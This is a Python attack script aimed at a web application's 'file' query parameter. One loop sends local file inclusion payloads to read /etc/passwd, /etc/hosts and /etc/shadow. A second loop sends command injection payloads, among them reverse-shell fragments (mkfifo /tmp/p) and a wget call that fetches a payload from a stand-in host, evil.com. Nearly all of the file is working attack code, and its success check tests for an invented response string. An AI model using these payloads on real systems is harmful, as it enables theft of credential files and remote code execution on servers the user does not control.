import requests

# Attempting Local File Inclusion vulnerability by making HTTP requests to include and read local files on the target server using an unsanitized input.
# LFI URL and parameter configuration
url = "http://example.com/index.php"  # Target web application URL
parameter = "?file="                 # Query parameter name for file path

# List of payloads to test for LFI vulnerability
payloads = [
    "../etc/passwd",      # Attempt to read /etc/passwd file
    "/etc/hosts",         # Attempt to read /etc/hosts file
    "file:///etc/shadow"  # Attempt to read /etc/shadow file
]

# Iterate through the list of payloads and attempt an LFI request for each
for payload in payloads:
    malicious_url = url + parameter + payload
    try:
        response = requests.get(malicious_url)  # Make HTTP GET request
        print("Found: ", response.text)          # Print the content of the response if successful
    except Exception as e:
        print(e)              # Print error message if any exception occurred during the request

# RCE (Remote Code Execution)
# Attempting Remote Code Execution vulnerability by making HTTP requests to execute arbitrary commands on the target server using an unsanitized input.

url = "http://example.com/index.php"  # Target web application URL
parameter = "?file="                   # Query parameter name for file path

# List of payloads to test for RCE vulnerability
payloads = [
    "id; ls -l",         # Attempt to execute 'id' and 'ls -l' commands
    'bash -c "rm /tmp/f"',  # Attempt to remove a file using Bash shell
    'bash -c "mkfifo /tmp/p"',   # Attempt to create a pipe using Bash shell
    "; wget https://evil.com/malicious_payload"  # Attempt to download a file using an external tool (wget)
]

# Iterate through the list of payloads and attempt an RCE request for each
for payload in payloads:
    malicious_url = url + parameter + payload
    try:
        response = requests.get(malicious_url)  # Make HTTP GET request
        if "RCE executed successfully!" in response.text:   # Check if the expected output is present in the response
            print("Remote Code Execution successful!")
    except Exception as e:
        print(e)              # Print error message if any exception occurred during the request